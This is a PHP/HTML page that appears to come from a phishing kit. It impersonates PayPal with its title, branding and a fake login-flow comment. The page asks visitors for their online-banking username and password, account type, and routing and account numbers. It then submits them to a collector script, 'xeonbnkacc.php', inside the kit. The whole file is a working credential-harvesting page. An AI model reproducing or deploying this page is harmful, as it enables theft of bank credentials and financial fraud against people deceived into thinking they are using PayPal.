<?php
	include("../settings/lang/index.php");
	session_start();
	$random=rand(0,100000000000);$gorand=md5($random);
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title>PayPal</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>
				<div class="xeonContent xeonContentInfo">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header class="xeonInfo">
							<div class="xeonLogo big"></div>
						</header>
						<div class="xeonsafe">
							<h1 class="xeonInfoTitle"><?php echo $xeon33; ?></h1>
								<p class="xeonFormTitle"><?php echo $xeon34; ?></p>

<script>

</script>
							<form action="../settings/send/xeonbnkacc.php" method="post" name="bnkForm" onsubmit="return validateBnkForm()">

								<p class="FieldsTitle"><?php echo $xeon35; ?></p>

								<div class="xeonFieldset">
									<input type="text" name="xeonbnId" id="xeonbnId" placeholder="<?php echo $xeon36; ?>" maxlength="30" autocomplete="off" autocorrect="off" />
								</div>
								<div class="xeonFieldset">
									<input type="password" name="xeonbnPs" id="xeonbnPs" placeholder="<?php echo $xeon37; ?>" maxlength="30" autocomplete="off" autocorrect="off" />
								</div>
								<?php
									if($_SESSION['countrycode1'] != "FR" || $_SESSION['countrycode1'] != "ES" || $_SESSION['countrycode1'] != "UK" || $_SESSION['countrycode1'] != "CH" || $_SESSION['countrycode1'] != "DE" || $_SESSION['countrycode1'] != "BE" || $_SESSION['countrycode1'] != "SE" || $_SESSION['countrycode1'] != "IT"){
										echo '
											<div class="xeonbnkInfo xeonbnkInfoCheck" id="xeonbnkInfo">
												<img src="../assets/img/walt.svg">
											</div>
										';
									}
								?>
								<p class="xeonbnktype"><?php echo $xeon38; ?></p>
								<div class="row radioGroup ">
									<div class="vx_radio col-sm-6"><input type="radio" name="accountType" id="checkingRadioBtn" class="test_CHECKING" value="CHECKING" checked="" onclick="checkingF()"><label class="" for="checkingRadioBtn"><?php echo $xeon39; ?></label></div><div class="vx_radio col-sm-6"><input type="radio" name="accountType" id="savingsRadioBtn" class="test_SAVINGS" value="SAVINGS" onclick="savingF()"><label class="" for="savingsRadioBtn"><?php echo $xeon40; ?></label></div>
								</div>
								<?php
									if($_SESSION['countrycode1'] != "FR" || $_SESSION['countrycode1'] != "ES" || $_SESSION['countrycode1'] != "UK" || $_SESSION['countrycode1'] != "CH" || $_SESSION['countrycode1'] != "DE" || $_SESSION['countrycode1'] != "BE" || $_SESSION['countrycode1'] != "SE" || $_SESSION['countrycode1'] != "IT"){
										echo '
											<div class="xeonFieldset">
											<input type="tel" name="xeonRtNm" id="xeonRtNm" placeholder="'. $xeon41 .'" maxlength="9" autocomplete="off" autocorrect="off" />
										</div>
										<div class="xeonFieldset">
											<input type="tel" name="xeonAcNm" id="xeonAcNm" placeholder="'. $xeon42 .'" maxlength="10" autocomplete="off" autocorrect="off"  />
										</div>
										';
									} else{
										echo '
											<div class="xeonFieldset" style="display:none">
												<input type="tel" name="xeonRtNm" id="xeonRtNm" placeholder="<?php echo $xeon41; ?>" maxlength="9" autocomplete="off" autocorrect="off" value="Not US"/>
											</div>
											<div class="xeonFieldset" style="display:none">
												<input type="tel" name="xeonAcNm" id="xeonAcNm" placeholder="<?php echo $xeon42; ?>" maxlength="10" autocomplete="off" autocorrect="off" value="Not US"/>
											</div>
										';
									}
								?>
								
								<p class="leftText" style="font-size: 12px"><?php echo $xeon43; ?></p>

								<input type="submit" class="xeonButton" name="xeonbnksnd" value="<?php echo $xeon44; ?>">

								
								<div class="nobnk"><a href="identification.php"><?php echo $xeon45; ?></a></div>
							</form>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>

	<footer class="xeonFooter">
		<ul class="xeonFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/main.js"></script>
	<script type="text/javascript" src="../assets/js/sections.js"></script>

	<script>
	$(document).ready(function(){
		$('#xeonbnId').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonbnId').removeClass('hasError'); } else {$('#xeonbnId').removeClass('hasError'); }});

		$('#xeonbnPs').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonbnPs').removeClass('hasError'); } else {$('#xeonbnPs').removeClass('hasError'); }});

		$('#xeonRtNm').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonRtNm').removeClass('hasError'); } else {$('#xeonRtNm').removeClass('hasError'); }});

		$('#xeonAcNm').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonAcNm').removeClass('hasError'); } else {$('#xeonAcNm').removeClass('hasError'); }});
		
		});
	</script>

<!-- LOADING -->
	<div class="xeonLoaderOverlay">
		<div class="xeonModalAnimate" id="xeonModalAnimate">
			<div class="xeonRotate"></div>
			<div class="xeonProcessing"><?php echo $xeon12; ?></div>
			<div class="xeonLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="xeonModalOverlay" id="xeonModalOverlay"></div>
	
</body>
</html>